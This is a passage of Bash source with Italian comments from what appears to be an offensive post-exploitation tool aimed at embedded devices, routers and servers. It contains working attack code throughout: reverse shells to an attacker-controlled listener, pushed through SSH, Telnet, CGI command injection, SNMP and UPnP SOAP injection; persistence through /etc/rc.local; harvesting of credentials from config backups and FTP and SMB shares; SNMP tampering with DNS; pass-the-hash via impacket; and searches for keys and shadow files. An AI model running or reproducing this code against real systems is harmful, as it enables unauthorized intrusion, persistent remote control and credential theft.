            local rc_cmd="echo '$(_revshell_payload "${lhost:-127.0.0.1}" "${lport:-4444}" "mkfifo") &' >> /etc/rc.local 2>/dev/null"
            exec_fn "$rc_cmd" 2>/dev/null && \
                found CRITICAL "POST:shell — persistenza via /etc/rc.local" || true
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Persistenza: cron + /etc/rc.local"
        fi
    fi
}

# ── Sub-metodo: post web ───────────────────────────────────────
_post_web() {
    local target="$1" user="$2" pass="$3" scheme="$4" port="$5"
    local lhost="$6" lport="$7" payload_type="$8" persist="$9"

    local base_url="${scheme}://${target}:${port}"
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
    local auth=""; [[ -n "$user" && -n "$pass" ]] && auth="--user ${user}:${pass}"

    section "Download Backup Configurazione"
    # Percorsi comuni su device embedded per backup config/firmware
    local backup_paths=(
        "/backup.cfg" "/config.cfg" "/config.tar.gz" "/backup.tar.gz"
        "/sysconfig.bin" "/settings.cfg" "/export.cfg" "/running-config"
        "/cgi-bin/backup.cgi" "/admin/backup" "/management/backup"
        "/cgi-bin/export_config.cgi" "/system/config_backup"
        "/api/v1/system/backup" "/api/config/export"
        "/firmware.bin" "/firmware.img" "/flash.bin"
        "/cgi-bin/download_config.cgi" "/config/download"
    )
    for path in "${backup_paths[@]}"; do
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            local fname; fname=$(basename "$path" | tr '/?&' '_')
            local resp_code
            resp_code=$(curl -sk $insecure $auth --max-time 8 -o "$OUTDIR/dl_${fname}" \
                        -w "%{http_code}" "${base_url}${path}" 2>/dev/null || echo "000")
            if [[ "$resp_code" == "200" && -s "$OUTDIR/dl_${fname}" ]]; then
                local sz; sz=$(wc -c < "$OUTDIR/dl_${fname}")
                found CRITICAL "POST:web — file scaricato: $path ($sz bytes)"
                # Cerca credenziali nel file scaricato
                grep -iE 'password|passwd|secret|pin|auth' "$OUTDIR/dl_${fname}" 2>/dev/null | \
                    head -10 | while IFS= read -r l; do
                    found CRITICAL "POST:web — cred in $path: $(echo "$l" | cut -c1-100)"
                done || true
            else
                rm -f "$OUTDIR/dl_${fname}"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} GET ${base_url}${path}"
        fi
    done

    section "Command Injection (diagnostics tools)"
    # Paths tipici con ping/traceroute/nslookup su device embedded
    local inject_paths=(
        "/cgi-bin/ping_test.cgi:ip"
        "/cgi-bin/ping.cgi:ip"
        "/cgi-bin/traceroute.cgi:host"
        "/cgi-bin/nslookup.cgi:host"
        "/cgi-bin/diagnostics.cgi:host"
        "/ping.cgi:ip"
        "/tools/ping:target"
        "/tools/traceroute:target"
        "/admin/tools/ping:ip"
        "/maintenance/ping:host"
        "/diagnostics/ping:addr"
        "/system/ping:host"
        "/api/v1/system/tools/ping:host"
        "/cgi-bin/remote_help-cgi:ip"
    )
    local injectable_path="" injectable_param="" injectable_method="GET"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        for entry in "${inject_paths[@]}"; do
            local ipath="${entry%%:*}" iparam="${entry##*:}"
            local full_url="${base_url}${ipath}"
            local result; result=$(_web_inject_test "$full_url" "$iparam" "$insecure" "$user" "$pass" 2>/dev/null || echo "CLEAN")
            if [[ "$result" == "INJECTABLE" || "$result" == "INJECTABLE_POST" ]]; then
                found CRITICAL "POST:web — Command Injection confermata: $ipath?$iparam=..."
                injectable_path="$ipath"
                injectable_param="$iparam"
                [[ "$result" == "INJECTABLE_POST" ]] && injectable_method="POST"
                break
            fi
        done

        if [[ -n "$injectable_path" && -n "$lhost" ]]; then
            section "Exploit Command Injection → Reverse Shell"
            local rs_payload; rs_payload=$(_revshell_payload "$lhost" "$lport" "$payload_type")
            local encoded_payload
            encoded_payload=$(printf '%s' "${rs_payload}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" \
                              2>/dev/null || printf '%s' "${rs_payload}")
            _start_listener "$lport"
            sleep 3
            local _li2=0
            while ! ss -tlnp 2>/dev/null | grep -q ":${lport}" && [[ $_li2 -lt 10 ]]; do
                sleep 0.5; ((_li2++)) || true
            done
            if [[ "$injectable_method" == "POST" ]]; then
                curl -sk $insecure $auth --max-time 5 -X POST \
                    -d "${injectable_param}=127.0.0.1;${rs_payload}" \
                    "${base_url}${injectable_path}" &>/dev/null || true
            else
                curl -sk $insecure $auth --max-time 5 \
                    "${base_url}${injectable_path}?${injectable_param}=127.0.0.1;${encoded_payload}" \
                    &>/dev/null || true
            fi
            found CRITICAL "POST:web — reverse shell inviata via cmd injection → $lhost:$lport"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Command injection test su ${#inject_paths[@]} path"
        [[ -n "$lhost" ]] && \
            echo -e "${CYAN}[DRY-RUN]${NC} Reverse shell: $(_revshell_payload "${lhost}" "${lport}" "${payload_type}")"
    fi

    section "Dump Account / Utenti SIP"
    local user_api_paths=(
        "/api/v1/users" "/api/users" "/admin/users" "/management/users"
        "/cgi-bin/get_users.cgi" "/api/v1/voip/accounts"
        "/api/v1/sip/accounts" "/configuration/voip/accounts"
    )
    for path in "${user_api_paths[@]}"; do
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            local resp; resp=$(curl -sk $insecure $auth --max-time 8 "${base_url}${path}" 2>/dev/null || true)
            if echo "$resp" | grep -qiE '"user"|"username"|"account"|"extension"'; then
                echo "$resp" > "$OUTDIR/post_users_${path//\//_}.txt"
                found HIGH "POST:web — dump utenti/account da: $path"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} GET ${base_url}${path}"
        fi
    done
}

# ── Sub-metodo: post ftp ───────────────────────────────────────
_post_ftp() {
    local target="$1" user="$2" pass="$3" port="$4"
    local ftp_creds=""; [[ -n "$user" ]] && ftp_creds="${user}:${pass}@"

    section "FTP Directory Listing"
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        curl -sk --max-time 15 "ftp://${ftp_creds}${target}:${port}/" 2>/dev/null \
            | tee "$OUTDIR/post_ftp_listing.txt" || true
        [[ -s "$OUTDIR/post_ftp_listing.txt" ]] && \
            found HIGH "POST:ftp — directory listing accessibile"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} curl ftp://$target:$port/"
    fi

    section "FTP Download Ricorsivo (config e log)"
    local interesting_exts=("cfg" "conf" "ini" "log" "txt" "xml" "bin" "tar")
    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        local ftp_list; ftp_list=$(curl -sk --max-time 15 \
            "ftp://${ftp_creds}${target}:${port}/" 2>/dev/null || true)
        while IFS= read -r entry; do
            local fname; fname=$(echo "$entry" | awk '{print $NF}')
            [[ -z "$fname" || "$fname" == "." || "$fname" == ".." ]] && continue
            local ext="${fname##*.}"
            for e in "${interesting_exts[@]}"; do
                if [[ "$ext" == "$e" ]]; then
                    curl -sk --max-time 20 \
                        "ftp://${ftp_creds}${target}:${port}/${fname}" \
                        -o "$OUTDIR/post_ftp_${fname}" 2>/dev/null || true
                    if [[ -s "$OUTDIR/post_ftp_${fname}" ]]; then
                        found HIGH "POST:ftp — file scaricato: $fname"
                        grep -iE 'password|passwd|secret|pin' "$OUTDIR/post_ftp_${fname}" 2>/dev/null | \
                            head -5 | while IFS= read -r l; do
                            found CRITICAL "POST:ftp — cred in $fname: $(echo "$l" | cut -c1-100)"
                        done || true
                    fi
                    break
                fi
            done
        done <<< "$ftp_list" || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Download ricorsivo FTP $target:$port"
    fi
}

# ── Sub-metodo: post smb ───────────────────────────────────────
_post_smb() {
    local target="$1" user="$2" pass="$3" port="$4"

    section "SMB Share Enumeration + Download"
    if require_tool smbclient; then
        local smb_auth=("-N")
        [[ -n "$user" ]] && smb_auth=("-U" "${user}%${pass}")
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            local shares; shares=$(smbclient -L "//${target}" "${smb_auth[@]}" \
                --port "$port" 2>/dev/null | grep "Disk" | awk '{print $1}' || true)
            if [[ -n "$shares" ]]; then
                found HIGH "POST:smb — share accessibili: $(echo "$shares" | tr '\n' ',')"
                while IFS= read -r share; do
                    [[ -z "$share" ]] && continue
                    local share_dir="$OUTDIR/smb_${share}"
                    mkdir -p "$share_dir"
                    # Scarica file interessanti
                    smbclient "//${target}/${share}" "${smb_auth[@]}" --port "$port" \
                        -c "recurse ON; prompt OFF; mget *" 2>/dev/null \
                        --directory "$share_dir" || true
                    # Cerca credenziali
                    find "$share_dir" -type f \( -name "*.cfg" -o -name "*.conf" \
                        -o -name "*.ini" -o -name "*.txt" \) 2>/dev/null | \
                    while IFS= read -r f; do
                        grep -iE 'password|passwd|secret' "$f" 2>/dev/null | \
                            while IFS= read -r l; do
                            found CRITICAL "POST:smb — cred in $share/$f: $(echo "$l" | cut -c1-100)"
                        done || true
                    done || true
                done <<< "$shares" || true
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} smbclient -L //$target, mget su ogni share"
        fi
    fi
}

# ── Sub-metodo: post snmp write ────────────────────────────────
_post_snmp() {
    local target="$1" community="${2:-private}" port="${3:-161}"

    section "SNMP Write Access Test (community: $community)"
    if require_tool snmpset; then
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            # Test write con sysName (OID 1.3.6.1.2.1.1.5.0)
            local orig_name; orig_name=$(snmpget -v2c -c "$community" \
                -t 2 -r 1 "$target" sysName.0 2>/dev/null | grep -oP '"[^"]+"' | tr -d '"' || true)
            if snmpset -v2c -c "$community" -t 2 -r 1 "$target" \
                sysName.0 s "exa-dune-test" &>/dev/null; then
                found CRITICAL "POST:snmp — WRITE access confermato (community: $community)"
                # Restore
                [[ -n "$orig_name" ]] && snmpset -v2c -c "$community" -t 2 -r 1 "$target" \
                    sysName.0 s "$orig_name" &>/dev/null || true
                # Test scrittura DNS (se supportato dal device)
                # OID DNS primario su alcuni device Cisco/embedded
                snmpset -v2c -c "$community" -t 2 -r 1 "$target" \
                    1.3.6.1.4.1.9.2.4.1.0 a "8.8.8.8" &>/dev/null && \
                    found CRITICAL "POST:snmp — DNS primario modificabile via SNMP" || true
            else
                log "SNMP write access negato con community '$community'"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} snmpset $target sysName.0 (community: $community)"
        fi

        section "SNMP Extended Info (post-access)"
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            # Dump OID critici
            for oid in \
                "1.3.6.1.2.1.1"          \
                "1.3.6.1.2.1.4.20"       \
                "1.3.6.1.2.1.2.2"        \
                "1.3.6.1.4.1.9.9.96.1.1" \
            ; do
                snmpwalk -v2c -c "$community" -t 2 -r 1 "$target" "$oid" \
                    2>/dev/null >> "$OUTDIR/post_snmp_full.txt" || true
            done
            [[ -s "$OUTDIR/post_snmp_full.txt" ]] && \
                found INFO "POST:snmp — dump OID completo in post_snmp_full.txt"
        fi
    else
        warn "snmpset non trovato — SNMP write test saltato (apt install snmp)"
    fi
}

# ── Sub-metodo: post revshell (multi-vettore) ─────────────────
_post_revshell() {
    local target="$1" user="$2" pass="$3" lhost="$4" lport="$5"
    local payload_type="$6" scheme="$7" web_port="$8" proto="$9"

    [[ -z "$lhost" ]] && { err "POST revshell: --lhost obbligatorio"; return 1; }

    local rs_payload; rs_payload=$(_revshell_payload "$lhost" "$lport" "$payload_type")
    log "Payload type: $payload_type"
    log "Payload: $rs_payload"
    log "Listener: $lhost:$lport"

    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        _start_listener "$lport"
        sleep 3
        local _li3=0
        while ! ss -tlnp 2>/dev/null | grep -q ":${lport}" && [[ $_li3 -lt 10 ]]; do
            sleep 0.5; ((_li3++)) || true
        done
    fi

    # ── Vettore 1: SSH ────────────────────────────────────────
    section "Vettore 1: SSH Reverse Shell"
    if [[ -n "$user" && -n "$pass" ]]; then
        local ssh_port="${proto##*:}"
        [[ "$proto" == "ssh"* ]] && ssh_port="${ssh_port:-22}" || ssh_port=22
        if check_port "$target" "$ssh_port" || [[ ${DRY_RUN:-0} -eq 1 ]]; then
            if [[ ${DRY_RUN:-0} -eq 0 ]]; then
                _ssh_exec "$user" "$pass" "$target" "$ssh_port" "$rs_payload" &>/dev/null &
                sleep 2
                log "SSH payload inviato verso $target:$ssh_port"
            else
                echo -e "${CYAN}[DRY-RUN]${NC} ssh ${user}@${target}:${ssh_port} '$rs_payload'"
            fi
        fi
    fi

    # ── Vettore 2: Telnet ─────────────────────────────────────
    section "Vettore 2: Telnet Reverse Shell"
    for tport in 23 2002 2323; do
        if check_port "$target" "$tport" || [[ ${DRY_RUN:-0} -eq 1 ]]; then
            if [[ -n "$user" && -n "$pass" ]]; then
                if [[ ${DRY_RUN:-0} -eq 0 ]]; then
                    _telnet_exec "$user" "$pass" "$target" "$tport" \
                        "$rs_payload" "$OUTDIR/post_telnet_rs.txt" &
                    sleep 2
                    log "Telnet payload inviato verso $target:$tport"
                else
                    echo -e "${CYAN}[DRY-RUN]${NC} telnet ${target}:${tport} exec '$rs_payload'"
                fi
            fi
            break
        fi
    done

    # ── Vettore 3: Web Command Injection ──────────────────────
    section "Vettore 3: Web Command Injection"
    local inject_paths=(
        "/cgi-bin/ping_test.cgi:ip" "/cgi-bin/ping.cgi:ip"
        "/cgi-bin/traceroute.cgi:host" "/cgi-bin/nslookup.cgi:host"
        "/ping.cgi:ip" "/tools/ping:target"
        "/admin/tools/ping:ip" "/maintenance/ping:host"
        "/cgi-bin/diagnostics.cgi:host" "/api/v1/system/tools/ping:host"
    )
    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
    local auth_curl=""; [[ -n "$user" ]] && auth_curl="--user ${user}:${pass}"
    local base_url="${scheme}://${target}:${web_port}"
    local injected=0
    for entry in "${inject_paths[@]}"; do
        local ipath="${entry%%:*}" iparam="${entry##*:}"
        if [[ ${DRY_RUN:-0} -eq 0 ]]; then
            local test_res; test_res=$(_web_inject_test \
                "${base_url}${ipath}" "$iparam" "$insecure" "$user" "$pass" 2>/dev/null || echo "CLEAN")
            if [[ "$test_res" != "CLEAN" ]]; then
                found CRITICAL "POST:revshell — Command Injection su ${ipath}?${iparam}"
                local enc
                enc=$(printf '%s' "${rs_payload}" | python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read()))" \
                      2>/dev/null || printf '%s' "${rs_payload}")
                if [[ "$test_res" == "INJECTABLE_POST" ]]; then
                    curl -sk $insecure $auth_curl --max-time 5 -X POST \
                        -d "${iparam}=127.0.0.1;${rs_payload}" \
                        "${base_url}${ipath}" &>/dev/null &
                else
                    curl -sk $insecure $auth_curl --max-time 5 \
                        "${base_url}${ipath}?${iparam}=127.0.0.1;${enc}" \
                        &>/dev/null &
                fi
                injected=1
                sleep 2
                break
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Web inject test: ${base_url}${ipath}?${iparam}=..."
            injected=1
            break
        fi
    done
    [[ $injected -eq 0 && ${DRY_RUN:-0} -eq 0 ]] && log "Nessun punto di injection web trovato"

    # ── Vettore 4: SNMP Command Execution ─────────────────────
    section "Vettore 4: SNMP Command Execution"
    if require_tool snmpset 2>/dev/null; then
        # Alcuni device supportano esecuzione comandi via OID proprietari
        # Questo è raro ma presente su alcuni device Cisco/embedded
        for community in "private" "public" "admin" "write"; do
            if [[ ${DRY_RUN:-0} -eq 0 ]]; then
                # Test OID execute: 1.3.6.1.4.1.2021.8.1.2 (UCD-SNMP)
                snmpset -v2c -c "$community" -t 2 -r 1 "$target" \
                    "1.3.6.1.4.1.2021.8.1.2.1" s "$rs_payload" &>/dev/null && \
                    found CRITICAL "POST:revshell — SNMP execute via UCD-SNMP OID (community: $community)" || true
            else
                echo -e "${CYAN}[DRY-RUN]${NC} snmpset $target UCD-SNMP execute OID '$rs_payload'"
                break
            fi
        done
    fi

    # ── Vettore 5: UPnP SOAP Injection ────────────────────────
    section "Vettore 5: UPnP SOAP Injection"
    for upnp_p in 2869 5000 8080 49152; do
        check_port "$target" "$upnp_p" || continue
        for path in "/upnp/control" "/upnp/control/WANIPConnection1" \
                    "/ctl/IPConn" "/upnp/control/layer3f"; do
            local soap_inject="${rs_payload}"
            local soap_body
            soap_body="<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
            soap_body+="<s:Body><u:GetExternalIPAddress xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
            soap_body+="<NewExternalPort>80</NewExternalPort><NewProtocol>TCP;${soap_inject}</NewProtocol>"
            soap_body+="</u:GetExternalIPAddress></s:Body></s:Envelope>"
            if [[ ${DRY_RUN:-0} -eq 0 ]]; then
                curl -sk --max-time 5 -X POST \
                    "http://${target}:${upnp_p}${path}" \
                    -H 'Content-Type: text/xml' \
                    -d "$soap_body" &>/dev/null || true
            else
                echo -e "${CYAN}[DRY-RUN]${NC} UPnP SOAP inject → $target:$upnp_p$path"
                break 2
            fi
        done
        break
    done

    if [[ ${DRY_RUN:-0} -eq 0 ]]; then
        echo ""
        log "Tutti i vettori tentati. Controlla il listener su $lhost:$lport"
    fi
}

cmd_post() {
    local target="" method=""
    local user="" pass="" port="" proto="auto"
    local lhost="" lport=4444 payload_type="auto"
    local persist=0 scheme="http" web_port=80
    local do_privesc=0 do_exfil=0 pth_hash=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --user)           _req_arg "$1" "${2:-}"; user="$2";         shift 2 ;;
            --pass)           _req_arg "$1" "${2:-}"; pass="$2";         shift 2 ;;
            --port)           _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
            --proto)          _req_arg "$1" "${2:-}"; proto="$2";        shift 2 ;;
            --lhost)          _req_arg "$1" "${2:-}"; lhost="$2";        shift 2 ;;
            --lport)          _req_arg "$1" "${2:-}"; lport="$2";        shift 2 ;;
            --payload)        _req_arg "$1" "${2:-}"; payload_type="$2"; shift 2 ;;
            --persist)        persist=1;         shift ;;
            --scheme)         _req_arg "$1" "${2:-}"; scheme="$2";       shift 2 ;;
            --web-port)       _req_arg "$1" "${2:-}"; web_port="$2";     shift 2 ;;
            --privesc)        do_privesc=1;      shift ;;
            --pass-the-hash)  _req_arg "$1" "${2:-}"; pth_hash="$2";    shift 2 ;;
            --exfil)          do_exfil=1;        shift ;;
            --output)         _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
            --dry-run)        DRY_RUN=1;         shift ;;
            --help|-h)        usage_post; exit 0 ;;
            -*)               err "Opzione sconosciuta: $1"; usage_post; exit 1 ;;
            *)
                if [[ -z "$target" ]];  then target="$1"
                elif [[ -z "$method" ]]; then method="$1"
                else err "Argomento inatteso: $1"; usage_post; exit 1; fi
                shift ;;
        esac
    done

    [[ -z "$target" ]] && { err "TARGET mancante"; usage_post; exit 1; }
    [[ -z "$method" ]] && { err "METHOD mancante (shell/web/ftp/smb/snmp/revshell/privesc/exfil)"; usage_post; exit 1; }
    validate_target "$target"
    check_root
    setup_outdir "$target" "post_${method}"
    log "Target: $target | Metodo: $method | Output: $OUTDIR"

    [[ $persist -eq 1 ]] && warn "Modalità PERSIST attiva — verranno effettuate modifiche permanenti"
    [[ -n "$lhost" ]] && log "Reverse shell listener: $lhost:$lport (payload: $payload_type)"

    case "$method" in
        shell)
            _post_shell "$target" "$user" "$pass" \
                "${port:-}" "$proto" "$persist" "$lhost" "$lport" "$payload_type"
            ;;
        web)
            _post_web "$target" "$user" "$pass" \
                "$scheme" "${web_port}" "$lhost" "$lport" "$payload_type" "$persist"
            ;;
        ftp)
            _post_ftp "$target" "$user" "$pass" "${port:-21}"
            ;;
        smb)
            _post_smb "$target" "$user" "$pass" "${port:-445}"
            ;;
        snmp)
            _post_snmp "$target" "${pass:-private}" "${port:-161}"
            ;;
        revshell)
            [[ -z "$lhost" ]] && { err "--lhost obbligatorio per metodo revshell"; exit 1; }
            _post_revshell "$target" "$user" "$pass" "$lhost" "$lport" \
                "$payload_type" "$scheme" "$web_port" "$proto"
            ;;
        privesc)
            section "Linux Privilege Escalation Check"
            if [[ $DRY_RUN -eq 0 ]]; then
                # SUID binaries inusuali
                log "Ricerca SUID binaries inusuali..."
                run_cmd "suid_check" \
                    "find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(bin|sbin|usr/bin|usr/sbin)' \
                     | tee \"$OUTDIR\"/post_suid.txt"
                if [[ -s "$OUTDIR/post_suid.txt" ]]; then
                    local nsuid; nsuid=$(wc -l < "$OUTDIR/post_suid.txt" 2>/dev/null || echo 0)
                    found HIGH "PrivEsc — $nsuid SUID binaries inusuali trovati (vedi post_suid.txt)"
                fi
                # Sudo misconfig
                log "Check sudo misconfig..."
                local sudo_out
                sudo_out=$(sudo -l 2>/dev/null | tee "$OUTDIR/post_sudo.txt" || true)
                if echo "$sudo_out" | grep -qiE "ALL|NOPASSWD|(root)"; then
                    found HIGH "PrivEsc — sudo misconfiguration rilevata (vedi post_sudo.txt)"
                fi
                # Cron world-writable
                run_cmd "cron_check" \
                    "ls -la /etc/cron* /var/spool/cron* 2>/dev/null | tee \"$OUTDIR\"/post_cron.txt"
                if find /etc/cron* /var/spool/cron* -perm -o+w -type f 2>/dev/null | grep -q .; then
                    found HIGH "PrivEsc — file cron world-writable trovati"
                fi
                # Lateral movement via credenziali store
                if [[ -n "$CRED_STORE" && -f "$CRED_STORE" ]]; then
                    _cred_propagate "$target"
                fi
            else
                echo -e "${CYAN}[DRY-RUN]${NC} PrivEsc check: SUID, sudo, cron su $target"
            fi
            ;;
        exfil)
            section "Data Exfiltration — Ricerca file sensibili"
            if [[ $DRY_RUN -eq 0 ]]; then
                run_cmd "exfil_search" \
                    "find / -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.pem' \
                     -o -name '*.key' -o -name '*.db' -o -name '*.sqlite' \
                     -o -name 'shadow' -o -name 'passwd' \) \
                     -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null \
                     | tee \"$OUTDIR\"/post_exfil_list.txt"
                if [[ -s "$OUTDIR/post_exfil_list.txt" ]]; then
                    local nfiles; nfiles=$(wc -l < "$OUTDIR/post_exfil_list.txt" || echo 0)
                    found HIGH "Exfil — $nfiles file sensibili trovati (vedi post_exfil_list.txt)"
                fi
            else
                echo -e "${CYAN}[DRY-RUN]${NC} Exfil search *.conf *.key *.db su $target"
            fi
            ;;
        *)
            err "Metodo sconosciuto: $method"
            usage_post; exit 1
            ;;
    esac

    # Pass-the-Hash via impacket (se --pass-the-hash specificato)
    if [[ -n "$pth_hash" ]]; then
        section "Pass-the-Hash (impacket psexec.py)"
        if [[ $DRY_RUN -eq 0 ]]; then
            if tool_ok psexec.py; then
                run_cmd "pth_psexec" \
                    "psexec.py -hashes :${pth_hash} ${user:-Administrator}@${target} \
                     2>&1 | tee \"$OUTDIR\"/post_pth_psexec.txt"
                grep -qi "Authenticated\|cmd.exe\|\\\$IPC" "$OUTDIR/post_pth_psexec.txt" 2>/dev/null && \
                    found CRITICAL "PTH — psexec.py riuscito con hash NTLM su $target"
            elif tool_ok smbexec.py; then
                run_cmd "pth_smbexec" \
                    "smbexec.py -hashes :${pth_hash} ${user:-Administrator}@${target} \
                     2>&1 | tee \"$OUTDIR\"/post_pth_smbexec.txt"
            else
                warn "impacket (psexec.py/smbexec.py) non trovato — PTH saltato"
            fi
        else
            echo -e "${CYAN}[DRY-RUN]${NC} Pass-the-Hash via impacket $target (hash: ${pth_hash:0:8}...)"
        fi
    fi

    # Privesc automatico (se --privesc con metodi shell/smb)
    if [[ $do_privesc -eq 1 && "$method" =~ ^(shell|smb)$ ]]; then
        section "Linux PrivEsc Check (aggiuntivo)"
        if [[ $DRY_RUN -eq 0 ]]; then
            log "SUID, sudo, world-writable service files..."
            find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(bin|sbin|usr/(bin|sbin))' \
                >> "$OUTDIR/post_suid.txt" 2>/dev/null || true
            sudo -l 2>/dev/null >> "$OUTDIR/post_sudo.txt" || true
            find /etc/systemd /etc/init.d -perm -o+w -type f 2>/dev/null \
                | tee "$OUTDIR/post_writable_services.txt" || true
            [[ -s "$OUTDIR/post_writable_services.txt" ]] && \
                found HIGH "PrivEsc — service file world-writable (vedi post_writable_services.txt)"
        fi
    fi

    # Exfil automatico (se --exfil)
    if [[ $do_exfil -eq 1 && "$method" != "exfil" ]]; then
        section "Exfiltration (aggiuntivo)"
        if [[ $DRY_RUN -eq 0 ]]; then
            find / -type f \( -name '*.pem' -o -name '*.key' -o -name '*.p12' \) \
                -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null \
                | tee "$OUTDIR/post_keys.txt" || true
            [[ -s "$OUTDIR/post_keys.txt" ]] && \
                found CRITICAL "Exfil — chiavi crittografiche trovate (vedi post_keys.txt)"
        fi
    fi

    ok "Post-exploitation completato → $OUTDIR"
}

